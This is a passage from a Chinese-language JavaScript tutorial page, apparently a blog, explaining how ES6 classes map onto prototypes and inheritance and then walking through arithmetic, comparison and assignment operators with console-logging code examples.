true</span></span><br></pre></td></tr></table></figure>

<h3 id="16-2-原型与类的联系"><a href="#16-2-原型与类的联系" class="headerlink" title="16.2 原型与类的联系"></a>16.2 原型与类的联系</h3><h4 id="16-2-1-类与原型的基本关系"><a href="#16-2-1-类与原型的基本关系" class="headerlink" title="16.2.1 类与原型的基本关系"></a>16.2.1 类与原型的基本关系</h4><p><strong>详细解释：</strong></p>
<ul>
<li><strong>ES6的<code>class</code>只是原型继承的语法糖</strong>，它让开发者可以用更熟悉、更面向对象的方式编写代码，但底层仍然基于原型链实现。</li>
<li><strong>类中定义的方法</strong>会被添加到构造函数的原型对象上，所有实例共享这些方法。</li>
<li><strong>类的<code>prototype</code>属性</strong>指向原型对象，与构造函数的<code>prototype</code>相同。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6 class写法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">createAnonymous</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;匿名用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于ES5原型写法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property">createAnonymous</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;匿名用户&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证方法在原型上</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">greet</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(p) === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有实例共享同一方法</span></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">greet</span> === p2.<span class="property">greet</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="16-2-2-类方法在原型上的体现"><a href="#16-2-2-类方法在原型上的体现" class="headerlink" title="16.2.2 类方法在原型上的体现"></a>16.2.2 类方法在原型上的体现</h4><p><strong>详细解释：</strong></p>
<ul>
<li><strong>实例方法</strong>：类中定义的普通方法会被添加到原型对象上，所有实例共享。</li>
<li><strong>静态方法</strong>：被添加到类本身，而不是原型上。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">staticMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是静态方法&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证方法在原型上</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span>); <span class="comment">// [Function: greet]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Person</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有实例共享同一方法</span></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">greet</span> === p2.<span class="property">greet</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态方法在构造函数上，不在原型上</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">staticMethod</span>); <span class="comment">// [Function: staticMethod]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">staticMethod</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<h4 id="16-2-3-继承与原型链"><a href="#16-2-3-继承与原型链" class="headerlink" title="16.2.3 继承与原型链"></a>16.2.3 继承与原型链</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>extends</code>关键字实现的继承，实际上是设置子类的<code>prototype</code>指向父类的<code>prototype</code>，建立原型链。</li>
<li><code>super</code>关键字在方法中指向父类的原型，在构造函数中指向父类构造函数。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">speak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> 发出声音`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">speak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">speak</span>(); <span class="comment">// 相当于 Animal.prototype.speak.call(this)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> 汪汪叫`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证原型链</span></span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;小黑&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Dog</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Object</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型链关系</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(dog) === <span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>) === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>) === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="16-2-4-类中访问和操作原型"><a href="#16-2-4-类中访问和操作原型" class="headerlink" title="16.2.4 类中访问和操作原型"></a>16.2.4 类中访问和操作原型</h4><p><strong>详细解释：</strong></p>
<ul>
<li>类本身也有<code>prototype</code>属性，可以直接操作。</li>
<li>可以通过实例的<code>__proto__</code>或<code>Object.getPrototypeOf()</code>访问原型。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态添加方法到原型</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">p.<span class="title function_">sayHello</span>(); <span class="comment">// &quot;Hello, 张三!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改已有的原型方法</span></span><br><span class="line"><span class="keyword">const</span> originalGreet = <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span>;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before greet&quot;</span>);</span><br><span class="line">  originalGreet.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After greet&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">greet</span>();</span><br><span class="line"><span class="comment">// Before greet</span></span><br><span class="line"><span class="comment">// Hello, 张三!</span></span><br><span class="line"><span class="comment">// After greet</span></span><br></pre></td></tr></table></figure>

<h4 id="16-2-5-类与原型的高级应用"><a href="#16-2-5-类与原型的高级应用" class="headerlink" title="16.2.5 类与原型的高级应用"></a>16.2.5 类与原型的高级应用</h4><p><strong>详细解释：</strong></p>
<ul>
<li>可以使用<code>Object.setPrototypeOf()</code>动态改变类的原型链。</li>
<li>类的继承机制底层使用<code>Object.create()</code>。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">speak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;动物发出声音&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">  <span class="title function_">bark</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;汪汪&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态设置Dog的原型为Animal</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.<span class="title function_">speak</span>(); <span class="comment">// &quot;动物发出声音&quot;</span></span><br><span class="line">dog.<span class="title function_">bark</span>(); <span class="comment">// &quot;汪汪&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Dog</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 手动实现继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手动实现继承</span></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Dog</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于 class Dog extends Animal</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;小黑&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Dog</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h2 id="17-运算符"><a href="#17-运算符" class="headerlink" title="17. 运算符"></a>17. 运算符</h2><h3 id="17-1-算术运算符"><a href="#17-1-算术运算符" class="headerlink" title="17.1 算术运算符"></a>17.1 算术运算符</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于执行数学计算</li>
<li>包括加、减、乘、除、取模、递增、递减等</li>
<li><code>+</code>运算符也用于字符串拼接</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本算术</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> + <span class="number">3</span>); <span class="comment">// 8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> - <span class="number">3</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> * <span class="number">3</span>); <span class="comment">// 15</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> / <span class="number">3</span>); <span class="comment">// 1.6666666666666667</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> % <span class="number">3</span>); <span class="comment">// 2（取模）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递增递减</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a++); <span class="comment">// 5（后递增）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(++a); <span class="comment">// 7（先递增）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="number">5</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b--); <span class="comment">// 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(--b); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拼接</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;World&quot;</span>); <span class="comment">// &quot;Hello World&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span> + <span class="number">3</span>); <span class="comment">// &quot;53&quot;（字符串拼接）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> + <span class="string">&quot;3&quot;</span>); <span class="comment">// &quot;53&quot;（字符串拼接）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span> - <span class="number">3</span>); <span class="comment">// 2（自动转换为数字）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一元加号转换为数字</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="string">&quot;5&quot;</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="string">&quot;5.5&quot;</span>); <span class="comment">// 5.5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="string">&quot;abc&quot;</span>); <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指数运算符（ES2016+）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span> ** <span class="number">3</span>); <span class="comment">// 8（2的3次方）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span> ** <span class="number">0.5</span>); <span class="comment">// 2（平方根）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 位运算符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &amp; <span class="number">3</span>); <span class="comment">// 1（按位与）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> | <span class="number">3</span>); <span class="comment">// 7（按位或）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> ^ <span class="number">3</span>); <span class="comment">// 6（按位异或）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(~<span class="number">5</span>); <span class="comment">// -6（按位取反）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &lt;&lt; <span class="number">1</span>); <span class="comment">// 10（左移）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &gt;&gt; <span class="number">1</span>); <span class="comment">// 2（有符号右移）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &gt;&gt;&gt; <span class="number">1</span>); <span class="comment">// 2（无符号右移）</span></span><br></pre></td></tr></table></figure>

<h3 id="17-2-比较运算符"><a href="#17-2-比较运算符" class="headerlink" title="17.2 比较运算符"></a>17.2 比较运算符</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于比较两个值</li>
<li>返回布尔值（true或false）</li>
<li>包括相等、不等、大于、小于等</li>
<li>有宽松相等（&#x3D;&#x3D;）和严格相等（&#x3D;&#x3D;&#x3D;）之分</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相等比较</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> == <span class="string">&quot;5&quot;</span>); <span class="comment">// true（宽松相等，类型转换）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> === <span class="string">&quot;5&quot;</span>); <span class="comment">// false（严格相等，不转换类型）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> != <span class="string">&quot;5&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> !== <span class="string">&quot;5&quot;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小比较</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &gt; <span class="number">3</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &lt; <span class="number">3</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &gt;= <span class="number">5</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &lt;= <span class="number">3</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 特殊值比较</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> == <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span> == <span class="title class_">NaN</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span> === <span class="title class_">NaN</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Object.is比较（ES6+）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">NaN</span>, <span class="title class_">NaN</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(-<span class="number">0</span>, +<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(-<span class="number">0</span>, -<span class="number">0</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较对象</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">value</span>: <span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">value</span>: <span class="number">5</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1 == obj2); <span class="comment">// false（比较引用）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property">value</span> == obj2.<span class="property">value</span>); <span class="comment">// true（比较值）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较字符串</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;apple&quot;</span> &lt; <span class="string">&quot;banana&quot;</span>); <span class="comment">// true（按字典序）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;apple&quot;</span> &lt; <span class="string">&quot;Apple&quot;</span>); <span class="comment">// false（大写字母在小写字母前）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;apple&quot;</span>.<span class="title function_">localeCompare</span>(<span class="string">&quot;banana&quot;</span>)); <span class="comment">// -1（-1,0,1）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较日期</span></span><br><span class="line"><span class="keyword">var</span> date1 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2023</span>, <span class="number">9</span>, <span class="number">15</span>);</span><br><span class="line"><span class="keyword">var</span> date2 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2023</span>, <span class="number">9</span>, <span class="number">16</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date1 &lt; date2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="17-3-赋值运算符"><a href="#17-3-赋值运算符" class="headerlink" title="17.3 赋值运算符"></a>17.3 赋值运算符</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于给变量赋值</li>
<li>包括简单赋值和复合赋值</li>
<li>复合赋值是运算和赋值的简写形式</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单赋值</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复合赋值</span></span><br><span class="line">x += <span class="number">5</span>; <span class="comment">// x = x + 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line">x -= <span class="number">3</span>; <span class="comment">// x = x - 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line">x *= <span class="number">2</span>; <span class="comment">// x = x * 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 24</span></span><br><span class="line"></span><br><span class="line">x /= <span class="number">4</span>; <span class="comment">// x = x / 4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line">x %= <span class="number">4</span>; <span class="comment">// x = x % 4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他复合赋值</span></span><br><span class="line">x **= <span class="number">3</span>; <span class="comment">// x = x ** 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链式赋值</span></span><br><span class="line"><span class="keyword">var</span> a, b, c;</span><br><span class="line">a = b = c = <span class="number">10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c); <span class="comment">// 10 10 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：赋值表达式返回赋值后的值</span></span><br><span class="line"><span 